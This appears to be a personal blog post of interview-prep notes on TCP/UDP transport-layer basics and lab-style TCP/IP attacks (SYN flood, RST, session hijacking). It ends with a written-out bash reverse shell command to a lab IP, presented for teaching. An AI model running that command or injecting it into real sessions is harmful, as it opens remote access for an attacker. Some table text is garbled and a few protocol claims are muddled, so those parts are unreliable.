<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="for my X interview, basically focus on the Computer networks. I really recommend the Neso Academy lesson. And this note also included some seed labs content.  1. Transport Layer It is responsible for">
<meta property="og:type" content="article">
<meta property="og:title" content="Transport Layer Protocols and Web Security">
<meta property="og:url" content="http://example.com/2025/03/14/Transport-Layer-Protocols-and-Web-Security/index.html">
<meta property="og:site_name" content="Yanran Xie&#39;s Blog">
<meta property="og:description" content="for my X interview, basically focus on the Computer networks. I really recommend the Neso Academy lesson. And this note also included some seed labs content.  1. Transport Layer It is responsible for">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="attachment:dcc47129-c0e3-4086-8ba5-4c34213be94f:image.png">
<meta property="og:image" content="attachment:4c608475-64f1-440e-8530-c0978b1c7db5:image.png">
<meta property="og:image" content="attachment:57a2e589-e8f1-4cfc-9fb1-148f012a8a8b:image.png">
<meta property="og:image" content="attachment:3a5c5e39-be6a-4249-89d8-a8da1e3d4d59:image.png">
<meta property="article:published_time" content="2025-03-14T11:06:17.000Z">
<meta property="article:modified_time" content="2025-03-14T11:08:04.722Z">
<meta property="article:author" content="Yanran Xie">
<meta property="article:tag" content="Web Security">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="attachment:dcc47129-c0e3-4086-8ba5-4c34213be94f:image.png">

<link rel="canonical" href="http://example.com/2025/03/14/Transport-Layer-Protocols-and-Web-Security/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'en'
  };
</script>

  <title>Transport Layer Protocols and Web Security | Yanran Xie's Blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Yanran Xie's Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/03/14/Transport-Layer-Protocols-and-Web-Security/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Yanran Xie">
      <meta itemprop="description" content="cyber trash">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Yanran Xie's Blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Transport Layer Protocols and Web Security
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2025-03-14 19:06:17 / Modified: 19:08:04" itemprop="dateCreated datePublished" datetime="2025-03-14T19:06:17+08:00">2025-03-14</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Interview-preparation/" itemprop="url" rel="index"><span itemprop="name">Interview preparation</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <blockquote>
<p>for my X interview, basically focus on the Computer networks. I
really recommend the Neso Academy lesson. And this note also included
some seed labs content.</p>
</blockquote>
<h1 id="transport-layer">1. Transport Layer</h1>
<p>It is responsible for process to process delivery of the entire
message.</p>
<p>Services provided by transport layer</p>
<ul>
<li>Port addressing</li>
<li>Segmentation and Reassembly</li>
<li>Connection Control</li>
<li>Flow Control</li>
<li>Error Control</li>
</ul>
<figure>
<img src="attachment:dcc47129-c0e3-4086-8ba5-4c34213be94f:image.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<h2 id="port-addressing">1.1 Port addressing</h2>
<ul>
<li>The <strong>IP address</strong> identifies a device. The
<strong>port number(16 bit)</strong> identifies a specific process. A
port is identifies for each transport protocol.</li>
<li>Port numbers also in the uniform resource locators(URLs)</li>
</ul>
<h2 id="transport-layer-protocolstcp-and-udp">1.2 Transport Layer
Protocols‚Äî‚ÄîTCP and UDP</h2>
<h3 id="tcp-udp">1.2.1 TCP &amp;&amp; UDP</h3>
<table>
<colgroup>
<col style="width: 33%" />
<col style="width: 33%" />
<col style="width: 33%" />
</colgroup>
<thead>
<tr>
<th></th>
<th>UDP</th>
<th>TCP</th>
</tr>
</thead>
<tbody>
<tr>
<td>Full name</td>
<td>User Datagram Protocol</td>
<td>Transmission Control Protocol</td>
</tr>
<tr>
<td>Used by</td>
<td>Used by applications that cannot tolerate small loss of data and can
tolerate delay:</td>
<td></td>
</tr>
</tbody>
</table>
<p><strong>Domain Name System(DNS)</strong> <strong>Dynamic Host
Configuration Protocol(DHCP)</strong> Online games | Used by applicants
that can tolerate delay but cannot tolerate loss: HTTP FTP Telnet SMTP |
| Error control | NO | Yes | | Flow control | NO | Yes | | Connection
Control | Connectionless and unreliable | Connection and reliable | |
Header fields | simple | complicated |</p>
<h3 id="phases-of-tcp-transmission">1.2.2 <strong>3 Phases of TCP
Transmission</strong></h3>
<p><strong>TCP Connection establishment:</strong> Three-Way
Handshaking</p>
<ul>
<li><strong>SYN</strong> ‚Üí Client sends a <strong>SYN (synchronize)
packet</strong> to the server, requesting a connection.</li>
<li><strong>SYN-ACK</strong> ‚Üí Server responds with
<strong>SYN-ACK</strong>, acknowledging the request.</li>
<li><strong>ACK</strong> ‚Üí Client replies with <strong>ACK</strong>,
confirming the connection.</li>
</ul>
<p><strong>Data Transfer:</strong> TCP ensures <strong>reliable and
ordered</strong> data transmission</p>
<ul>
<li>flow control: TCP uses a sliding window to handle flow control.
Between Go-Back-N protocol and Selective repeat. And the sliding window
size is dynamic.</li>
<li>Congestion control: The sender have the congestion window determined
by the receiver but also by the congestion in the network. The size is
dynamic. Not only the congestion window but also have congestion policy.
The congestion policy based on 3 phases. The slow start(starts with a
very slow rate of transmission); congestion avoidance(after reached the
threshold); The congestion detection(return to other phase)</li>
</ul>
<p><strong>Connection Termination:</strong> Four-Way Handshaking</p>
<ul>
<li><strong>FIN</strong> ‚Üí Client sends a <strong>FIN (finish)</strong>
request to end communication.</li>
<li><strong>ACK</strong> ‚Üí Server acknowledges the request.</li>
<li><strong>FIN</strong> ‚Üí Server also sends a <strong>FIN</strong>,
indicating it‚Äôs ready to close.</li>
<li><strong>ACK</strong> ‚Üí Client sends a final <strong>ACK</strong>,
confirming the termination.</li>
</ul>
<h1 id="attacks-on-tcpip-protocols">2. Attacks on TCP/IP Protocols</h1>
<blockquote>
<p>In the computer networks security class, we use <code>netwox</code>
tool to implement ARP cache poisoning attack, ICMP redirect attack</p>
</blockquote>
<h2 id="syn-flooding-attack">2.1 SYN Flooding Attack</h2>
<p>SYN flood is a form of DoS attack in which attackers send many SYN
requests to a victim‚Äôs TCP port, but the attackers have no intention to
finish the 3-way handshake procedure. In the TCP establish phase.
Attackers either use spoofed IP address or do not continue the
procedure. Through this attack, attackers can flood the victim‚Äôs queue
that is used for half-opened connections, i.e. the connections that has
finished SYN, SYN-ACK, but has not yet gotten a final ACK back. When
this queue is full, the victim cannot take any more connection. Figure 2
illustrates the attack.</p>
<figure>
<img src="attachment:4c608475-64f1-440e-8530-c0978b1c7db5:image.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>close the <strong>SYN Cookie Countermeasure.</strong> The server will
discards the SYN entry. If the server later receives an ACK response
from the client, it can use the cookie to reconstruct the SYN queue
entry.</p>
<h2 id="tcp-rst-attacks-on-telnet-connectionsssh">2.2 TCP RST Attacks on
telnet Connections/ssh</h2>
<p>The TCP RST Attack can terminate an established TCP connection
between two victims. For example, if there is an established telnet
connection (TCP) between two users A and B, attackers can spoof a RST
packet from A to B, breaking this existing connection. To succeed in
this attack, attackers need to correctly construct the TCP RST
packet.</p>
<aside>
<p>üí°</p>
<p>Launching the attack manually. Please use Scapy to conduct the TCP
RST attack. A skeleton code is provided in the following.</p>
</aside>
<aside>
<p>üí°</p>
<p>Launching the attack by <code>netwox</code>.</p>
</aside>
<p>you can also use this kind of attack to break the TCP connection
between a host and the video streaming applicants.</p>
<h2 id="tcp-session-hijacking">2.3 TCP Session Hijacking</h2>
<p>The objective of the TCP Session Hijacking attack is to hijack an
existing TCP connection (session) between two victims by injecting
malicious contents into this session. If this connection is a telnet
session, attackers can inject malicious commands (e.g. deleting an
important file) into this session, causing the victims to execute the
malicious commands. Figure 3 depicts how the attack works. In this task,
you need to demonstrate how you can hijack a telnet session between two
computers. Your goal is to get the telnet server to run a malicious
command from you. For the simplicity of the task, we assume that the
attacker and the victim are on the same LAN.</p>
<aside>
<p>üí°</p>
<p>Launching the attack manually. Please use Scapy to conduct the TCP
Session Hijacking attack. A skeleton code is provided in the
following.</p>
</aside>
<aside>
<p>üí°</p>
<p>Launching the attack by <code>netwox</code>.</p>
</aside>
<figure>
<img src="attachment:57a2e589-e8f1-4cfc-9fb1-148f012a8a8b:image.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<ul>
<li><strong>Sniffing the Network Traffic</strong>:¬†The attacker listens
to the communication between A and B, capturing the ongoing TCP session,
including the <strong>IP addresses</strong>, <strong>TCP sequence
numbers</strong>, and <strong>ACK numbers</strong>.</li>
<li><strong>Sending Spoofed Packets</strong>: The attacker
<strong>forges a TCP packet</strong> that appears to come from B (by
using B‚Äôs IP address and the correct sequence numbers). The packet will
be crafted to look like a legitimate response to A.</li>
</ul>
<h2 id="creating-reverse-shell-using-tcp-session-hijacking">2.4 Creating
Reverse Shell using TCP Session Hijacking</h2>
<p>When attackers are able to inject a command to the victim‚Äôs machine
using TCP session hijacking, they are not interested in running one
simple command on the victim machine, they are interested in running
many commands. Obviously, running all these commands all through TCP
session hijacking is inconvenient. What attackers want to achieve is to
use the attack to set up a back door, so they can use this back door to
conveniently conduct further damages.</p>
<p>A typical way to set up back doors is to run a reverse shell from the
victim machine. Reverse shell is a shell process running on a remote
machine, connecting back to the attacker‚Äôs machine. This gives an
attacker a convenient way to access a remote machine once it has been
compromised.</p>
<p>In the following, we will show how we can set up a reverse shell if
we can directly run a command on the victim machine. In the TCP session
hijacking attack, attackers cannot directly run a command on the victim
machine, so their jobs is to run a reverse-shell command through the
session hijacking attack.</p>
<aside>
<p>üí°</p>
<p>In the summary</p>
<ul>
<li><strong>TCP session hijacking</strong> is used to <strong>inject
malicious commands</strong> into an existing session.</li>
<li>The ultimate goal is to <strong>establish a reverse shell</strong>
that provides <strong>remote access</strong> to the compromised system.
Once the reverse shell is set up, the attacker can use it to execute
further commands and achieve long-term control over the victim
machine.</li>
</ul>
</aside>
<figure>
<img src="attachment:3a5c5e39-be6a-4249-89d8-a8da1e3d4d59:image.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>In summery,
<code>"/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1‚Äù</code>
(and this is a <strong>Reverse Shell Command)</strong> starts a bash
shell, with its input coming from a tcp connection, and its standard and
error outputs being redirected to the same tcp connection.</p>

    </div>

    
    
    

      <footer class="post-footer">
            <i class="fa fa-tag"></i>
          <div class="post-tags">
              <a href="/tags/Web-Security/" rel="tag"> Web Security</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2025/03/13/Network-Layer-Protocols-and-Web-Security-2/" rel="prev" title="Network Layer Protocols and Web Security_2">
      <i class="fa fa-chevron-left"></i> Network Layer Protocols and Web Security_2
    </a></div>
      <div class="post-nav-item"></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#transport-layer"><span class="nav-number">1.</span> <span class="nav-text">1. Transport Layer</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#port-addressing"><span class="nav-number">1.1.</span> <span class="nav-text">1.1 Port addressing</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#transport-layer-protocolstcp-and-udp"><span class="nav-number">1.2.</span> <span class="nav-text">1.2 Transport Layer
Protocols‚Äî‚ÄîTCP and UDP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#tcp-udp"><span class="nav-number">1.2.1.</span> <span class="nav-text">1.2.1 TCP &amp;&amp; UDP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phases-of-tcp-transmission"><span class="nav-number">1.2.2.</span> <span class="nav-text">1.2.2 3 Phases of TCP
Transmission</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#attacks-on-tcpip-protocols"><span class="nav-number">2.</span> <span class="nav-text">2. Attacks on TCP&#x2F;IP Protocols</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#syn-flooding-attack"><span class="nav-number">2.1.</span> <span class="nav-text">2.1 SYN Flooding Attack</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tcp-rst-attacks-on-telnet-connectionsssh"><span class="nav-number">2.2.</span> <span class="nav-text">2.2 TCP RST Attacks on
telnet Connections&#x2F;ssh</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tcp-session-hijacking"><span class="nav-number">2.3.</span> <span class="nav-text">2.3 TCP Session Hijacking</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#creating-reverse-shell-using-tcp-session-hijacking"><span class="nav-number">2.4.</span> <span class="nav-text">2.4 Creating
Reverse Shell using TCP Session Hijacking</span></a></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Yanran Xie</p>
  <div class="site-description" itemprop="description">cyber trash</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">8</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">2</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">2</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Yanran Xie</span>
</div>

<!--
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>
-->

        








      </div>
    </footer>
  </div>

  
  
  <script color='0,0,0' opacity='0.5' zIndex='-1' count='150' src="/lib/canvas-nest/canvas-nest.min.js"></script>
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  
      

<script>
  if (typeof MathJax === 'undefined') {
    window.MathJax = {
      loader: {
        source: {
          '[tex]/amsCd': '[tex]/amscd',
          '[tex]/AMScd': '[tex]/amscd'
        }
      },
      tex: {
        inlineMath: {'[+]': [['$', '$']]},
        tags: 'ams'
      },
      options: {
        renderActions: {
          findScript: [10, doc => {
            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
              const display = !!node.type.match(/; *mode=display/);
              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
              const text = document.createTextNode('');
              node.parentNode.replaceChild(text, node);
              math.start = {node: text, delim: '', n: 0};
              math.end = {node: text, delim: '', n: 0};
              doc.math.push(math);
            });
          }, '', false],
          insertedScript: [200, () => {
            document.querySelectorAll('mjx-container').forEach(node => {
              let target = node.parentNode;
              if (target.nodeName.toLowerCase() === 'li') {
                target.parentNode.classList.add('has-jax');
              }
            });
          }, '', false]
        }
      }
    };
    (function () {
      var script = document.createElement('script');
      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
      script.defer = true;
      document.head.appendChild(script);
    })();
  } else {
    MathJax.startup.document.state(0);
    MathJax.texReset();
    MathJax.typeset();
  }
</script>

    

  

</body>
</html>
